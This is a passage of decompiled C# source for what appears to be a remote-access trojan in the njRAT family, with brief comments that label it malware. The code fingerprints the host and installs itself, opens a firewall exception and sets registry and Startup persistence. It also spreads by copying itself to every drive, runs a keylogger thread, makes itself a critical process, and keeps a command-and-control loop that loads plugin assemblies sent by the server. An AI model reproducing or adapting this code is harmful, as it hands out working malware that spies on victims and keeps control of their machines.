      string str18;
      try
      {
        str18 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str17 + " x86" + OK.Y : str17 + " x64" + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str18 = str17 + OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str19 = (!OK.Cam() ? str18 + "No" + OK.Y : str18 + "Yes" + OK.Y) + OK.GetAntiVirus() + OK.Y + OK.GetAntiVirus() + OK.Y + OK.GetAntiVirus() + OK.Y;
      string str20 = "";
      try
      {
        string[] valueNames = OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG, RegistryKeyPermissionCheck.Default).GetValueNames();
        int index = 0;
        while (index < valueNames.Length)
        {
          string str21 = valueNames[index];
          if (str21.Length == 32)
            str20 = str20 + str21 + ",";
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str19 + str20;
    }

/**
 * @brief Installs the malware on the system
 */
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void INS()
    {
      Thread.Sleep(1000);
      if (OK.Idr && !OK.CompDir(OK.LO, new FileInfo(Interaction.Environ(OK.DR).ToLower() + "\\" + OK.EXE.ToLower())))
      {
        try
        {
          if (System.IO.File.Exists(Interaction.Environ(OK.DR) + "\\" + OK.EXE))
            System.IO.File.Delete(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
          FileStream fileStream = new FileStream(Interaction.Environ(OK.DR) + "\\" + OK.EXE, FileMode.CreateNew);
          byte[] array = System.IO.File.ReadAllBytes(OK.LO.FullName);
          fileStream.Write(array, 0, array.Length);
          fileStream.Flush();
          fileStream.Close();
          OK.LO = new FileInfo(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
          Process.Start(OK.LO.FullName);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.EndApp();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("netsh firewall add allowedprogram \"" + OK.LO.FullName + "\" \"" + OK.LO.Name + "\" ENABLE", AppWinStyle.Hide, true, 5000);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      if (OK.Isu)
      {
        try
        {
          OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (!OK.IsF)
        return;
      try
      {
        System.IO.File.Copy(OK.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", true);
        OK.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", FileMode.Open);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
/**
 * @brief Initializes malware operations including persistence, anti-analysis, and command loop
 */
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void ko()
    {
      if (OK.Anti_CH)
        CsAntiProcess.Start();
      if (OK.USB_SP)
      {
        string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          try
          {
            if (!System.IO.File.Exists(str + "Tools.exe"))
              System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, str + "Tools.exe");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
      }
      if (Interaction.Command() != null)
      {
        try
        {
          OK.F.Registry.CurrentUser.SetValue("di", (object) "!");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(5000);
      }
      bool createdNew = false;
      OK.MT = (object) new Mutex(true, OK.RG, out createdNew);
      if (!createdNew)
        ProjectData.EndApp();
      OK.INS();
      if (!OK.Idr)
      {
        OK.EXE = OK.LO.Name;
        OK.DR = OK.LO.Directory.Name;
      }
      new Thread(new ThreadStart(OK.RC), 1).Start();
      try
      {
        OK.kq = new kl();
        new Thread(new ThreadStart(OK.kq.WRK), 1).Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      int num = 0;
      string Left = "";
      if (OK.BD)
      {
        try
        {
          SystemEvents.SessionEnding += (SessionEndingEventHandler) ([DebuggerStepThrough] (a0, a1) => OK.ED());
          OK.pr(1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      while (true)
      {
        Thread.Sleep(1000);
        if (!OK.Cn)
          Left = "";
        Application.DoEvents();
        try
        {
          checked { ++num; }
          if (num == 5)
          {
            try
            {
              Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          if (num >= 8)
          {
            num = 0;
            string Right = OK.ACT();
            if (Operators.CompareString(Left, Right, false) != 0)
            {
              Left = Right;
              OK.Send("act" + OK.Y + Right);
            }
          }
          if (OK.Isu)
          {
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(OK.F.Registry.CurrentUser.GetValue(OK.sf + "\\" + OK.RG, (object) "")), (object) ("\"" + OK.LO.FullName + "\" .."), false))
                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(OK.F.Registry.LocalMachine.GetValue(OK.sf + "\\" + OK.RG, (object) "")), (object) ("\"" + OK.LO.FullName + "\" .."), false))
                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
    }

/**
 * @brief Calculates the MD5 hash of a byte array
 * 
 * @param B Byte array to hash
 * @return MD5 hash as a hexadecimal string
 */
    public static string md5(byte[] B)
    {
      B = new MD5CryptoServiceProvider().ComputeHash(B);
      string str = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        str += num.ToString("x2");
        checked { ++index; }
      }
      return str;
    }

    [DllImport("ntdll")]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

/**
 * @brief Loads a plugin from a byte array
 * 
 * @param b Byte array containing the plugin assembly
 * @param c Class identifier to instantiate
 * @return Instance of the plugin class or null if not found
 */
    public static object Plugin(byte[] b, string c)
    {
      Module[] modules = Assembly.Load(b).GetModules();
      int index1 = 0;
      while (index1 < modules.Length)
      {
        Module module = modules[index1];
        System.Type[] types = module.GetTypes();
        int index2 = 0;
        while (index2 < types.Length)
        {
          System.Type type = types[index2];
          if (type.FullName.EndsWith("." + c))
            return module.Assembly.CreateInstance(type.FullName);
          checked { ++index2; }
        }
        checked { ++index1; }
      }
      return (object) null;
    }

/**
 * @brief Sets process critical status to control termination behavior
 * 
 * @param i Value to set (0 for normal, 1 for critical)
 */
    public static void pr(int i)
    {
      try
      {
        OK.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

/**
 * @brief Maintains connection with C2 server and handles incoming data
 */
    public static void RC()
    {
      while (true)
      {
        OK.lastcap = "";
        if (OK.C != null)
        {
          long num1 = -1;
          int num2 = 0;
          try
          {
            while (true)
            {
              do
              {
                checked { ++num2; }
                if (num2 == 10)
                {
                  num2 = 0;
                  Thread.Sleep(1);
                }
                if (OK.Cn)
                {
                  if (OK.C.Available < 1)
                    OK.C.Client.Poll(-1, SelectMode.SelectRead);
                  do
                  {
                    if (OK.C.Available > 0)
                    {
                      if (num1 == -1L)
                      {
                        string str = "";
                        while (true)
                        {
                          int CharCode = OK.C.GetStream().ReadByte();
                          switch (CharCode)
                          {
                            case -1:
                              goto label_25;
                            case 0:
                              goto label_13;
                            default:
                              str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                              continue;
                          }
                        }
label_13:
                        num1 = Conversions.ToLong(str);
                        if (num1 == 0L)
                        {
                          OK.Send("");
                          num1 = -1L;
                        }
                      }
                      else
                        goto label_18;
                    }
                    else
                      goto label_23;
                  }
                  while (OK.C.Available > 0);
                  continue;
label_18:
                  OK.b = new byte[checked (OK.C.Available + 1 - 1 + 1)];
                  long num3 = checked (num1 - OK.MeM.Length);
                  if ((long) OK.b.Length > num3)
                    OK.b = new byte[checked ((int) (num3 - 1L) + 1 - 1 + 1)];
                  int count = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None);
                  OK.MeM.Write(OK.b, 0, count);
                }
                else
                  goto label_25;
              }
              while (OK.MeM.Length != num1);
              num1 = -1L;
              Thread thread = new Thread((ParameterizedThreadStart) ([DebuggerStepThrough] (a0) => OK.Ind((byte[]) a0)), 1);
              thread.Start((object) OK.MeM.ToArray());
              thread.Join(100);
              OK.MeM.Dispose();
              OK.MeM = new MemoryStream();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
label_23:;
        }
label_25:
        do
        {
          try
          {
            if (OK.PLG != null)
            {
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              OK.PLG = (object) null;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          OK.Cn = false;
        }
        while (!OK.connect());
        OK.Cn = true;
      }
    }
/**
 * @brief Converts a string to a UTF-8 byte array
 * 
 * @param S Reference to the string to convert
 * @return UTF-8 byte array
 */
    public static byte[] SB(ref string S) => Encoding.UTF8.GetBytes(S);
/**
 * @brief Sends a string to the remote server
 * 
 * @param S String to send
 * @return true if sent successfully, false otherwise
 */
    public static bool Send(string S) => OK.Sendb(OK.SB(ref S));

/**
 * @brief Sends a byte array to the remote server
 * 
 * @param b Byte array to send
 * @return true if sent successfully, false otherwise
 */
    public static bool Sendb(byte[] b)
    {
      if (!OK.Cn)
        return false;
      try
      {
        lock ((object) OK.LO)
        {
          if (!OK.Cn)
            return false;
          MemoryStream memoryStream = new MemoryStream();
          string S = b.Length.ToString() + "\0";
          byte[] buffer = OK.SB(ref S);
          memoryStream.Write(buffer, 0, buffer.Length);
          memoryStream.Write(b, 0, b.Length);
          OK.C.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        ProjectData.SetProjectError(ex1);
        try
        {
          if (OK.Cn)
          {
            OK.Cn = false;
            OK.C.Close();
          }
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return OK.Cn;
    }
/**
 * @brief Sets a registry value in the current user's registry
 * 
 * @param n Name of the registry value
 * @param t Value to set
 * @param typ Registry value type
 * @return true if successful, false otherwise
 */
    public static bool STV(string n, object t, RegistryValueKind typ)
    {
      bool flag;
      try
      {
        OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t)), typ);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return flag;
    }
/**
 * @brief Uninstalls the malware from the system
 */
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void UNS()
    {
      string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
      string[] logicalDrives = Directory.GetLogicalDrives();
      int index = 0;
      while (index < logicalDrives.Length)
      {
        string str = logicalDrives[index];
        try
        {
          if (System.IO.File.Exists(str + "Tools.exe"))
            System.IO.File.Delete(str + "Tools.exe");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      OK.pr(0);
      OK.Isu = false;
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("netsh firewall delete allowedprogram \"" + OK.LO.FullName + "\"", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        if (OK.FS != null)
        {
          OK.FS.Dispose();
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(OK.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + OK.LO.FullName + "\"", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      ProjectData.EndApp();
    }

/**
 * @brief Decompresses a byte array using GZip
 * 
 * @param B Compressed byte array
 * @return Decompressed byte array
 */
    public static byte[] ZIP(byte[] B)
    {
      MemoryStream memoryStream = new MemoryStream(B);
      GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
      byte[] buffer = new byte[4];
      memoryStream.Position = checked (memoryStream.Length - 5L);
      memoryStream.Read(buffer, 0, 4);
      int int32 = BitConverter.ToInt32(buffer, 0);
      memoryStream.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1 - 1 + 1)];
      gzipStream.Read(array, 0, int32);
      gzipStream.Dispose();
      memoryStream.Dispose();
      return array;
    }
  }
}
